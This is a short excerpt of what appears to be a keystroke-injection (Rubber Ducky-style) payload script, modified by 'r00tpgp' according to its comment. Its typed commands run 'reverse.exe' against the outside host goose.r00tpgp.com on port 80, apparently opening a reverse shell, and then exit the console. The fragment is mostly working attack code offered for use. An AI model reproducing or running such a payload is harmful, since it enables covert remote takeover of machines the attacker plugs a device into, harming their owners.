...
REM 27/12/2017: Mod by r00tpgp, removed admin privilege cmd, added auto overwrite on copy con & removed absolute path for source and dest
...
ENTER
STRING reverse.exe goose.r00tpgp.com 80
ENTER
STRING exit
ENTER